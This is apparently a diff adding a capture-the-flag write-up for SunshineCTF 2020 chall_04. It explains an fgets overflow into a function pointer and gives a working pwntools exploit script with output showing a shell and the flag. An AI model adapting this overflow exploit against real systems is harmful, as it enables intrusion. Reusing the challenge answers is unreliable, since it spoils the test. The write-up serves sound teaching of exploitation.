@@ -338,3 +338,73 @@ Sending:  b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPP\xd6\x
 $ cat flag.txt
 sun{warmness-on-the-soul-3b6aad1d8bb54732}
 ```
+
+## chall_04
+---
+Decompilation:
+
+```c
+void vuln(void)
+
+{
+  char local_48 [56];
+  code *local_10;
+  
+  fgets(local_48,100,stdin);
+  (*local_10)();
+  return;
+}
+
+void win(void)
+
+{
+  system("/bin/sh");
+  return;
+}
+
+```
+
+No using `gets` this time around! There is another kind of vulnerability here though. Notice how `fgets` is reading 100 bytes into `local_48`, which is a 56 byte array. The leftover input can be used to overwrite local_10 and change where the function jumps to.
+
+Exploit:
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.binary = ELF('./chall_04')
+
+if args.REMOTE:
+    io = remote('chal.2020.sunshinectf.org', 30004)
+else:
+    io = process(context.binary.path)
+
+print(io.recvline())
+io.sendline('throwaway')
+
+buffer = 'A' * 56
+payload = p64(0x04005b7) # address of win function
+
+exploit = flat(buffer, payload)
+print("Sending: ", exploit)
+io.sendline(exploit)
+
+io.interactive()
+```
+
+Output:
+```sh
+meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_04.py REMOTE
+[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_04'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to chal.2020.sunshinectf.org on port 30004: Done
+b'Like some kind of madness, was taking control.\n'
+Sending:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb7\x05@\x00\x00\x00\x00\x00'
+[*] Switching to interactive mode
+$ cat flag.txt
+sun{critical-acclaim-96cfde3d068e77bf}
+```
